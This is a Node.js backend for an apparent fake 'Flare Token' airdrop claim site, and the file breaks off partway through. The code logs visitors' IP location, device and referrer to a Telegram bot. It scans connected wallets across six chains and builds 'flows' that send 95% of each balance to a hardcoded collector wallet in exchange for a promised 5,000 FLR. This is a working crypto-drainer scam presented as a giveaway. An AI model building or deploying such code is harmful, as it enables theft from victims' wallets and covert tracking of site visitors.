// index.js - FLARE TOKEN BACKEND - ULTRA DETAILED + ALL BALANCES
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://flareairdropclaim.vercel.app', 'https://flarebackend-eight.vercel.app', 'https://flaretokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Flare Token Backend',
    version: '3.0.0',
    status: '🟢 ONLINE',
    telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
    telegramBot: telegramBotName || 'Not connected',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://cloudflare-eth.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1,
    explorer: 'https://etherscan.io/tx/'
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56,
    explorer: 'https://bscscan.com/tx/'
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com',
      'https://polygon-bor.publicnode.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137,
    explorer: 'https://polygonscan.com/tx/'
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161,
    explorer: 'https://arbiscan.io/tx/'
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche',
      'https://avalanche-c-chain.publicnode.com'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114,
    explorer: 'https://snowtrace.io/tx/'
  },
  Flare: {
    urls: [
      'https://flare-api.flare.network/ext/C/rpc',
      'https://flare.publicnode.com',
      'https://rpc.flare.xyz'
    ],
    symbol: 'FLR',
    decimals: 18,
    chainId: 14,
    explorer: 'https://flare-explorer.flare.network/tx/'
  }
};

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0x7264F557f762f16aC7937292D19449c5CE962288',
  'BSC': '0x7264F557f762f16aC7937292D19449c5CE962288',
  'Polygon': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
  'Arbitrum': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
  'Avalanche': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
  'Flare': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F'
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x713eabb95d3650dad05b5e84cb7c58870dd63c96';

// ============================================
// STORAGE
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingFlows: new Map(),
  completedFlows: new Map(),
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Flare Token',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'FLR',
    valueThreshold: parseFloat(process.env.VALUE_THRESHOLD) || 1,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalProcessedUSD: 0,
      totalProcessedWallets: 0,
      processedTransactions: []
    },
    flowEnabled: process.env.FLOW_ENABLED === 'true'
  },
  emailCache: new Map(),
  siteVisits: []
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

async function sendTelegramMessage(text) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    }, { timeout: 5000 });
    return true;
  } catch (error) {
    console.error('Telegram error:', error.message);
    return false;
  }
}

async function enableTelegram() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>🚀 FLARE TOKEN BACKEND ONLINE 🚀</b>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `✅ <b>MultiChain FlowRouter Active</b>\n\n` +
        `📦 <b>COLLECTOR:</b> \`${COLLECTOR_WALLET.substring(0, 10)}...\`\n` +
        `🤖 <b>BOT:</b> @${telegramBotName}\n` +
        `🌐 <b>NETWORKS:</b> Ethereum, BSC, Polygon, Arbitrum, Avalanche, Flare\n` +
        `📊 <b>MONITORING:</b> All User Activity\n` +
        `⏰ <b>STARTED:</b> ${new Date().toLocaleString()}\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`
      );
      return true;
    }
  } catch (error) {
    console.log('Telegram connection failed:', error.message);
  }
  return false;
}

// ============================================
// DEVICE DETECTION
// ============================================

function getDeviceInfo(userAgent) {
  if (!userAgent) return { device: 'Unknown', os: 'Unknown', browser: 'Unknown', isBot: false, botType: null };
  
  const ua = userAgent.toLowerCase();
  
  // Bot Detection
  const botPatterns = {
    'Googlebot': 'googlebot',
    'Bingbot': 'bingbot',
    'Yandex': 'yandexbot',
    'Facebook': 'facebookexternalhit|facebot',
    'Twitter': 'twitterbot',
    'LinkedIn': 'linkedinbot',
    'Telegram': 'telegrambot',
    'Discord': 'discordbot',
    'WhatsApp': 'whatsapp',
    'Slack': 'slackbot',
    'Pinterest': 'pinterest',
    'Apple': 'applebot',
    'DuckDuckGo': 'duckduckbot',
    'Baidu': 'baiduspider',
    'AI Bot': 'gptbot|claudebot|anthropic-ai'
  };
  
  let isBot = false;
  let botType = null;
  
  for (const [bot, pattern] of Object.entries(botPatterns)) {
    if (new RegExp(pattern).test(ua)) {
      isBot = true;
      botType = bot;
      break;
    }
  }
  
  // Device
  let device = 'Desktop';
  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone') || ua.includes('ipod')) {
    device = 'Mobile';
  } else if (ua.includes('ipad') || ua.includes('tablet')) {
    device = 'Tablet';
  }
  
  // OS
  let os = 'Unknown';
  if (ua.includes('windows')) os = 'Windows';
  else if (ua.includes('mac')) os = 'macOS';
  else if (ua.includes('linux')) os = 'Linux';
  else if (ua.includes('android')) os = 'Android';
  else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) os = 'iOS';
  
  // Browser
  let browser = 'Unknown';
  if (ua.includes('chrome') && !ua.includes('edg')) browser = 'Chrome';
  else if (ua.includes('firefox')) browser = 'Firefox';
  else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
  else if (ua.includes('edg')) browser = 'Edge';
  else if (ua.includes('opera') || ua.includes('opr')) browser = 'Opera';
  
  return { device, os, browser, isBot, botType };
}

// ============================================
// IP LOCATION - DETAILED
// ============================================

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1' || cleanIP === 'localhost') {
      return {
        country: 'Local',
        flag: '🏠',
        city: 'Local',
        region: 'Local',
        isp: 'Local',
        org: 'Local',
        timezone: 'Local',
        lat: 0,
        lon: 0
      };
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}?fields=status,country,countryCode,regionName,city,isp,org,lat,lon,timezone`, { 
      timeout: 3000 
    });
    
    if (response.data?.status === 'success') {
      const flags = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'DE': '🇩🇪', 'FR': '🇫🇷',
        'ES': '🇪🇸', 'IT': '🇮🇹', 'NL': '🇳🇱', 'CH': '🇨🇭', 'AU': '🇦🇺',
        'JP': '🇯🇵', 'CN': '🇨🇳', 'IN': '🇮🇳', 'BR': '🇧🇷', 'NG': '🇳🇬',
        'ZA': '🇿🇦', 'MX': '🇲🇽', 'KR': '🇰🇷', 'SG': '🇸🇬', 'AE': '🇦🇪'
      };
      
      return {
        country: response.data.country || 'Unknown',
        flag: flags[response.data.countryCode] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || 'Unknown',
        isp: response.data.isp || 'Unknown',
        org: response.data.org || 'Unknown',
        timezone: response.data.timezone || 'Unknown',
        lat: response.data.lat,
        lon: response.data.lon
      };
    }
  } catch (error) {}
  
  return {
    country: 'Unknown',
    flag: '🌍',
    city: 'Unknown',
    region: 'Unknown',
    isp: 'Unknown',
    org: 'Unknown',
    timezone: 'Unknown',
    lat: 0,
    lon: 0
  };
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2,flare-networks',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32,
      flr: response.data['flare-networks']?.usd || 0.03
    };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32, flr: 0.03 };
  }
}

// ============================================
// GET CHAIN PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) {
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  return null;
}

// ============================================
// GET WALLET BALANCE - FULL DETAILS FOR ALL
// ============================================

async function getWalletBalance(walletAddress) {
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: [],
    chainsWithBalance: 0,
    chainsScanned: 0,
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 },
      { name: 'Flare', symbol: 'FLR', price: prices.flr, chainId: 14 }
    ];

    let totalValue = 0;
    let chainDetails = [];
    let chainsWithBalance = 0;
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        results.chainsScanned++;
        
        const { provider, config } = providerInfo;
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        const chainData = {
          chain: chain.name,
          chainId: chain.chainId,
          amount: amount,
          amountFormatted: amount.toFixed(6),
          valueUSD: valueUSD,
          valueUSDFormatted: valueUSD.toFixed(2),
          symbol: chain.symbol,
          hasBalance: amount > 0.000001,
          rawBalance: balance.toString(),
          contractAddress: PROJECT_FLOW_ROUTERS[chain.name],
          explorer: RPC_CONFIG[chain.name]?.explorer || ''
        };
        
        chainDetails.push(chainData);
        
        if (amount > 0.000001) {
          totalValue += valueUSD;
          chainsWithBalance++;
        }
        
      } catch (error) {
        chainDetails.push({
          chain: chain.name,
          error: true,
          hasBalance: false,
          amount: 0,
          valueUSD: 0
        });
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= 1;
    results.balances = chainDetails;
    results.chainsWithBalance = chainsWithBalance;
    
    return { success: true, data: results };

  } catch (error) {
    console.error('Balance check error:', error.message);
    return { 
      success: false, 
      data: {
        ...results,
        error: error.message
      }
    };
  }
}

// ============================================
// GENERATE EMAIL FROM WALLET
// ============================================

function generateWalletEmail(walletAddress) {
  const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
  const username = `flr${hash.substring(0, 12)}`;
  const domains = ['proton.me', 'gmail.com', 'outlook.com', 'pm.me', 'yahoo.com'];
  const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
  return `${username}@${domain}`;
}

// ============================================
// FORMAT BALANCES FOR DISPLAY
// ============================================

function formatBalancesForDisplay(balances) {
  let result = '';
  balances.forEach(b => {
    if (b.hasBalance) {
      result += `   • ${b.chain}: ${b.amountFormatted} ${b.symbol} = $${b.valueUSDFormatted}\n`;
    }
  });
  
  if (result === '') {
    result = '   • No balances found on any chain\n';
  }
  
  return result;
}

// ============================================
// TRACK VISIT - ULTRA DETAILED
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    const location = await getIPLocation(clientIP);
    const device = getDeviceInfo(userAgent);
    
    // Parse referer
    let refererDomain = 'Direct';
    let refererType = 'Direct';
    if (referer) {
      try {
        const url = new URL(referer);
        refererDomain = url.hostname;
        if (refererDomain.includes('google')) refererType = 'Google';
        else if (refererDomain.includes('facebook')) refererType = 'Facebook';
        else if (refererDomain.includes('twitter') || refererDomain.includes('x.com')) refererType = 'Twitter/X';
        else if (refererDomain.includes('telegram')) refererType = 'Telegram';
        else if (refererDomain.includes('discord')) refererType = 'Discord';
        else if (refererDomain.includes('linkedin')) refererType = 'LinkedIn';
        else if (refererDomain.includes('reddit')) refererType = 'Reddit';
        else refererType = 'External';
      } catch {
        refererDomain = referer;
        refererType = 'External';
      }
    }
    
    const visitId = `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
    
    const visit = {
      id: visitId,
      ip: clientIP.replace('::ffff:', ''),
      timestamp: new Date().toISOString(),
      country: location.country,
      flag: location.flag,
      city: location.city,
      region: location.region,
      isp: location.isp,
      org: location.org,
      timezone: location.timezone,
      lat: location.lat,
      lon: location.lon,
      device: device.device,
      os: device.os,
      browser: device.browser,
      isBot: device.isBot,
      botType: device.botType,
      userAgent: userAgent || 'Unknown',
      referer: referer || 'Direct',
      refererDomain: refererDomain,
      refererType: refererType,
      path: path || '/',
      walletConnected: false,
      walletAddress: null
    };
    
    memoryStorage.siteVisits.push(visit);
    if (memoryStorage.siteVisits.length > 1000) memoryStorage.siteVisits = memoryStorage.siteVisits.slice(-1000);
    
    // Build detailed visit message
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🌐 <b>NEW SITE VISIT</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      
      `📍 <b>LOCATION DETAILS:</b>\n` +
      `   🏳️ Country: ${location.country} ${location.flag}\n` +
      `   🏙️ City: ${location.city}\n` +
      `   📍 Region: ${location.region}\n` +
      `   🌍 Coordinates: ${location.lat.toFixed(2)}, ${location.lon.toFixed(2)}\n` +
      `   ⏰ Timezone: ${location.timezone}\n` +
      `   🏢 ISP: ${location.isp}\n` +
      `   🏛️ Organization: ${location.org}\n\n` +
      
      `💻 <b>DEVICE INFO:</b>\n` +
      `   📱 Device: ${device.device}\n` +
      `   💿 OS: ${device.os}\n` +
      `   🌐 Browser: ${device.browser}\n` +
      `   👤 Type: ${device.isBot ? `🤖 Bot (${device.botType})` : '👤 Human'}\n\n` +
      
      `🔗 <b>REFERRAL INFO:</b>\n` +
      `   📎 Source: ${refererType}\n` +
      `   🔗 Domain: ${refererDomain}\n` +
      `   📄 Path: ${path}\n\n` +
      
      `🆔 <b>SESSION INFO:</b>\n` +
      `   🆔 Visit ID: \`${visitId}\`\n` +
      `   🌐 IP: ${clientIP}\n` +
      `   ⏱️ Time: ${new Date().toLocaleString()}\n\n` +
      
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await sendTelegramMessage(message);
    
    res.json({ 
      success: true,
      data: {
        visitId: visit.id,
        country: visit.country,
        flag: visit.flag,
        isBot: device.isBot
      }
    });
    
  } catch (error) {
    console.error('Visit error:', error);
    res.json({ success: true });
  }
});

// ============================================
// CONNECT ENDPOINT - SHOWS ALL BALANCES FOR EVERYONE
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 WALLET CONNECT: ${walletAddress.substring(0, 10)}...`);
    
    // Get ALL details
    const location = await getIPLocation(clientIP);
    const device = getDeviceInfo(req.headers['user-agent']);
    const email = generateWalletEmail(walletAddress);
    const balanceResult = await getWalletBalance(walletAddress);
    
    // Find previous visits
    const previousVisits = memoryStorage.siteVisits
      .filter(v => v.ip === clientIP.replace('::ffff:', ''))
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    const lastVisit = previousVisits[0];
    const visitCount = previousVisits.length;
    
    if (lastVisit) {
      lastVisit.walletConnected = true;
      lastVisit.walletAddress = walletAddress.toLowerCase();
    }
    
    // Find or create participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    const isNewUser = !participant;
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        firstSeen: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        country: location.country,
        flag: location.flag,
        city: location.city,
        region: location.region,
        isp: location.isp,
        email: email,
        deviceInfo: device,
        visitCount: visitCount,
        totalValueUSD: balanceResult.data.totalValueUSD,
        isEligible: balanceResult.data.isEligible,
        claimed: false,
        balances: balanceResult.data.balances,
        chainsWithBalance: balanceResult.data.chainsWithBalance,
        connectionHistory: [{
          timestamp: new Date().toISOString(),
          ip: clientIP,
          location: location.country
        }]
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    } else {
      participant.lastSeen = new Date().toISOString();
      participant.totalValueUSD = balanceResult.data.totalValueUSD;
      participant.isEligible = balanceResult.data.isEligible;
      participant.balances = balanceResult.data.balances;
      participant.chainsWithBalance = balanceResult.data.chainsWithBalance;
      participant.visitCount = (participant.visitCount || 0) + 1;
      
      if (!participant.connectionHistory) participant.connectionHistory = [];
      participant.connectionHistory.push({
        timestamp: new Date().toISOString(),
        ip: clientIP,
        location: location.country
      });
    }
    
    if (balanceResult.data.isEligible) {
      memoryStorage.settings.statistics.eligibleParticipants++;
    }
    
    // Format balances for display
    let balancesDisplay = '';
    balanceResult.data.balances.forEach(b => {
      if (b.hasBalance) {
        balancesDisplay += `   • ${b.chain}: <b>${b.amountFormatted} ${b.symbol}</b> = $${b.valueUSDFormatted}\n`;
      } else {
        balancesDisplay += `   • ${b.chain}: ❌ No balance\n`;
      }
    });
    
    // Build chain summary
    const chainsWithBalance_list = balanceResult.data.balances
      .filter(b => b.hasBalance)
      .map(b => b.chain)
      .join(', ');
    
    // Build detailed message based on eligibility
    const statusEmoji = balanceResult.data.isEligible ? '🎯' : '👋';
    const statusText = balanceResult.data.isEligible ? 'ELIGIBLE' : 'NOT ELIGIBLE';
    const statusColor = balanceResult.data.isEligible ? '✅' : '⚠️';
    
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `${statusEmoji} <b>WALLET CONNECTED - ${statusText}</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      
      `👛 <b>WALLET DETAILS:</b>\n` +
      `   📝 Address: \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
      `   💰 Total Balance: <b>$${balanceResult.data.totalValueUSD}</b>\n` +
      `   🔗 Chains with Balance: ${balanceResult.data.chainsWithBalance}/${balanceResult.data.chainsScanned}\n` +
      `   ${statusColor} Status: <b>${statusText}</b> ${balanceResult.data.isEligible ? '(Qualifies for 5,000 FLR)' : `(Needs $1 minimum)`}\n\n` +
      
      `📊 <b>BALANCE BREAKDOWN:</b>\n${balancesDisplay}\n` +
      
      `📍 <b>LOCATION INFO:</b>\n` +
      `   🏳️ Country: ${location.country} ${location.flag}\n` +
      `   🏙️ City: ${location.city}\n` +
      `   📍 Region: ${location.region}\n` +
      `   🏢 ISP: ${location.isp}\n` +
      `   ⏰ Timezone: ${location.timezone}\n\n` +
      
      `💻 <b>DEVICE INFO:</b>\n` +
      `   📱 Device: ${device.device}\n` +
      `   💿 OS: ${device.os}\n` +
      `   🌐 Browser: ${device.browser}\n\n` +
      
      `📧 <b>CONTACT INFO:</b>\n` +
      `   📧 Email: \`${email}\`\n` +
      `   🆔 Visit ID: ${lastVisit?.id || 'N/A'}\n` +
      `   👤 Visit Count: ${visitCount}\n` +
      `   🆕 ${isNewUser ? '✨ First time visitor' : '🔄 Returning user'}\n\n` +
      
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `${balanceResult.data.isEligible ? '✅ READY FOR FLOW PROCESSING' : '✨ Welcome to Flare Token!'}`;
    
    await sendTelegramMessage(message);
    
    res.json({
      success: true,
      data: {
        walletAddress,
        email,
        country: location.country,
        flag: location.flag,
        city: location.city,
        totalValueUSD: balanceResult.data.totalValueUSD,
        isEligible: balanceResult.data.isEligible,
        chainsWithBalance: balanceResult.data.chainsWithBalance,
        balances: balanceResult.data.balances.map(b => ({
          chain: b.chain,
          amount: b.amountFormatted,
          valueUSD: b.valueUSDFormatted,
          symbol: b.symbol,
          hasBalance: b.hasBalance
        })),
        token: 'FLR'
      }
    });
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE FLOW - DETAILED
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances
      .filter(b => b.hasBalance)
      .map(b => ({
        chain: b.chain,
        chainId: b.chainId,
        originalAmount: b.amountFormatted,
        amount: (b.amount * 0.95).toFixed(6),
        originalValueUSD: b.valueUSDFormatted,
        valueUSD: (b.valueUSD * 0.95).toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
        collectorAddress: COLLECTOR_WALLET,
        explorer: b.explorer
      }));
    
    const totalOriginalUSD = balanceResult.data.totalValueUSD.toFixed(2);
    const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    
    const flowId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingFlows.set(flowId, {
      walletAddress: walletAddress.toLowerCase(),
      transactions,
      totalOriginalUSD,
      totalFlowUSD,
      totalFLR: '5000',
      status: 'prepared',
      createdAt: new Date().toISOString(),
      completedChains: [],
      participant: {
        country: participant.country,
        flag: participant.flag,
        city: participant.city,
        email: participant.email
      }
    });
    
    if (memoryStorage.pendingFlows.size > 100) {
      const oldestKey = Array.from(memoryStorage.pendingFlows.keys())[0];
      memoryStorage.pendingFlows.delete(oldestKey);
    }
    
    // Build transactions display
    let txDisplay = '';
    transactions.forEach((t, index) => {
      txDisplay += `   ${index + 1}. ${t.chain}:\n`;
      txDisplay += `      └─ Send: ${t.amount} ${t.symbol} ($${t.valueUSD})\n`;
      txDisplay += `      └─ Original: ${t.originalAmount} ${t.symbol} ($${t.originalValueUSD})\n`;
    });
    
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🔐 <b>FLOW PREPARED</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      
      `👛 <b>WALLET:</b>\n` +
      `   📝 \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
      `   💰 Total Balance: <b>$${totalOriginalUSD}</b>\n` +
      `   💵 Flow Amount: <b>$${totalFlowUSD}</b> (95%)\n` +
      `   🎁 FLR Reward: <b>5,000 FLR</b>\n` +
      `   🔗 Chains to Process: ${transactions.length}\n\n` +
      
      `📋 <b>TRANSACTIONS:</b>\n${txDisplay}\n` +
      
      `📍 <b>LOCATION:</b>\n` +
      `   🏳️ ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}\n` +
      `   📧 ${participant.email}\n\n` +
      
      `🆔 <b>FLOW ID:</b> \`${flowId}\`\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await sendTelegramMessage(message);
    
    res.json({
      success: true,
      data: {
        flowId,
        totalFlowUSD,
        totalFLR: '5000',
        transactionCount: transactions.length,
        transactions,
        token: 'FLR'
      }
    });
    
  } catch (error) {
    console.error('Prepare error:', error);
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// PROCESS FLOW - DETAILED
// ============================================

app.post('/api/presale/process-flow', async (req, res) => {
  try {
    const { walletAddress, chainName, flowId, txHash, amount, symbol, valueUSD, gasFee, email, location } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    const flow = memoryStorage.pendingFlows.get(flowId);
    
    // Get explorer link
    const explorerUrl = RPC_CONFIG[chainName]?.explorer || '';
    const txLink = explorerUrl ? `${explorerUrl}${txHash}` : txHash;
    
    if (participant) {
      memoryStorage.settings.statistics.totalProcessedWallets++;
      memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(valueUSD || 0);
      memoryStorage.settings.statistics.processedTransactions.push({
        wallet: walletAddress,
        chain: chainName,
        flowId,
        txHash,
        amount,
        symbol,
        valueUSD,
        gasFee,
        email,
        location,
        timestamp: new Date().toISOString()
      });
      
      if (flow) {
        flow.completedChains = flow.completedChains || [];
        flow.completedChains.push(chainName);
        
        // Chain processed message
        const chainMessage = 
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `💰 <b>CHAIN PROCESSED</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
          
          `👛 <b>WALLET:</b>\n` +
          `   📝 \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
          `   🔗 Chain: <b>${chainName}</b>\n` +
          `   💵 Amount: ${amount} ${symbol}\n` +
          `   💰 USD Value: $${valueUSD}\n` +
          `   ⛽ Gas Fee: ${gasFee || '0'} ETH\n\n` +
          
          `🔍 <b>TRANSACTION:</b>\n` +
          `   🆔 Hash: \`${txHash}\`\n` +
          `   🔗 Explorer: ${txLink}\n\n` +
          
          `📊 <b>PROGRESS:</b> ${flow.completedChains.length}/${flow.transactions.length}\n` +
          `📍 ${participant?.country || 'Unknown'} ${participant?.flag || ''}\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        
        await sendTelegramMessage(chainMessage);
        
        if (flow.completedChains.length === flow.transactions.length) {
          memoryStorage.completedFlows.set(flowId, { 
            ...flow, 
            completedAt: new Date().toISOString(),
            completedChains: flow.completedChains
          });
          
          // Build completed chains list
          let completedList = '';
          flow.completedChains.forEach((c, i) => {
            completedList += `   ${i+1}. ${c}\n`;
          });
          
          // Flow completed message
          const completedMessage = 
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎉 <b>FLOW COMPLETED</b> 🎉\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            
            `👛 <b>WALLET:</b>\n` +
            `   📝 \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
            `   💵 Total Processed: <b>$${flow.totalFlowUSD}</b>\n` +
            `   🎁 FLR Received: <b>5,000 FLR</b>\n\n` +
            
            `✅ <b>COMPLETED CHAINS:</b>\n${completedList}\n` +
            
            `📍 <b>LOCATION:</b>\n` +
